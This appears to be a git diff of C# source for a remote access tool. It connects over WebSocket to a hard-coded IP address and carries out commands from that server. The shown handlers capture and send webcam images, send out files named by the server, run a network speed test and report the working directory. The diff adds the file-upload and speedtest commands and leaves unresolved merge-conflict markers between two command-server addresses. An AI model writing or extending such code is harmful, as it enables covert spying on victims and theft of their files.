@@ -14,7 +14,11 @@ namespace A3
     {
         static void Main(string[] args)
         {
+<<<<<<< HEAD
+            using (var ws = new WebSocket("ws://154.49.211.224"))
+=======
             using (var ws = new WebSocket("ws://154.49.211.230:4422"))
+>>>>>>> d85bc260b904e385373cc36df28e30e4f4cb68fd
             {
                 ws.OnMessage += (sender, e) =>
                 {
@@ -46,6 +50,26 @@ namespace A3
                         byte[] byteImage = ms.ToArray();
                         var SigBase64 = Convert.ToBase64String(byteImage);
                         ws.Send("##WEBCAM_SNAP##"+SigBase64);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }else if(message == "speedtest")
+                    {
+                        const string tempfile = "tempfile.tmp";
+                        System.Net.WebClient webClient = new System.Net.WebClient();
+                        Stopwatch sww = Stopwatch.StartNew();
+                        webClient.DownloadFile("http://www.ovh.net/files/100Mio.dat", tempfile);
+                        sww.Stop();
+
+                        FileInfo fileInfo = new FileInfo(tempfile);
+                        long speed = fileInfo.Length / sww.Elapsed.Milliseconds / 1000;
+                        string jj = "{\"duration\":\""+ sww.Elapsed.Milliseconds+"\",\"file_size\":\""+ fileInfo.Length.ToString("N0")+"\",\"speed\":\""+ speed.ToString("N0")+"\"}";
+                        ws.Send("##SPEEDTEST##" + jj);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }
+                    else if(message.StartsWith("upload_file"))
+                    {
+                        string[] msg = message.Split(' ');
+                        FileInfo info = new FileInfo(msg[1]);
+                        ws.Send(info);
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                     }
                     else
